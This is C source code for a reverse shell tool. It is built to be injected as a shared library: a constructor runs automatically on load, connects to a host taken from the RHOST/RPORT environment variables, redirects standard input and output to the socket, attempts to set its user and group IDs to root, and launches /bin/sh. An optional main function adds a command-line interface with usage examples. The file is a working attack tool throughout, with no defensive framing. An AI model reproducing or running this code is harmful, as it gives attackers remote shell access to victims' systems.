#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

static void reverse_shell(const char* host, int port) {
    fprintf(stderr, "[+] Starting reverse shell to %s:%d\n", host, port);
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "[-] Failed to create socket: %s\n", strerror(errno));
        return;
    }
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        fprintf(stderr, "[-] Invalid address: %s\n", host);
        close(sockfd);
        return;
    }
    
    fprintf(stderr, "[+] Connecting to %s:%d...\n", host, port);
    
    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "[-] Failed to connect: %s\n", strerror(errno));
        close(sockfd);
        return;
    }
    
    fprintf(stderr, "[+] Connected, spawning shell\n");
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    close(sockfd);
    
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    unsetenv("LD_PRELOAD");
    
    execl("/bin/sh", "sh", NULL);
    fprintf(stderr, "[-] Failed to execute shell: %s\n", strerror(errno));
}

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_REVERSE_ACTIVE")) return;
    if (getenv("SHELL_REVERSE_MAIN")) return;
    
    setenv("SHELL_REVERSE_ACTIVE", "1", 1);
    const char* host = getenv("RHOST");
    const char* port_str = getenv("RPORT");
    if (!host) return;
    int port = port_str ? atoi(port_str) : 4444;
    reverse_shell(host, port);
}

#ifdef ENABLE_MAIN
int main(int argc, char *argv[]) {
    setenv("SHELL_REVERSE_MAIN", "1", 1);
    setenv("SHELL_REVERSE_ACTIVE", "1", 1);
    
    char *host = NULL;
    int port = 4444;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("shell-reverse - Reverse shell utility\n");
            printf("Usage: %s [options] <host> [port]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -h, --help    Show this help message\n");
            printf("  -H <host>     Target host\n");
            printf("  -p <port>     Target port (default: 4444)\n");
            printf("\nExamples:\n");
            printf("  %s 192.168.1.100        # Connect to host on port 4444\n", argv[0]);
            printf("  %s 192.168.1.100 8080   # Connect to host on port 8080\n", argv[0]);
            printf("  %s -H 10.0.0.1 -p 1337  # Connect using options\n", argv[0]);
            printf("\nEnvironment:\n");
            printf("  RHOST=<host>  Target host (fallback if no args)\n");
            printf("  RPORT=<port>  Target port (fallback if no args)\n");
            return 0;
        } else if (strcmp(argv[i], "-H") == 0 && i + 1 < argc) {
            host = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            port = atoi(argv[++i]);
        } else if (argv[i][0] != '-') {
            if (!host) {
                host = argv[i];
            } else {
                port = atoi(argv[i]);
            }
        }
    }
    
    if (!host) {
        host = getenv("RHOST");
        const char* env_port = getenv("RPORT");
        if (env_port) port = atoi(env_port);
    }
    
    if (!host) {
        fprintf(stderr, "Error: No target host specified\n");
        fprintf(stderr, "Use: %s <host> or set RHOST environment variable\n", argv[0]);
        return 1;
    }
    
    reverse_shell(host, port);
    return 0;
}
#endif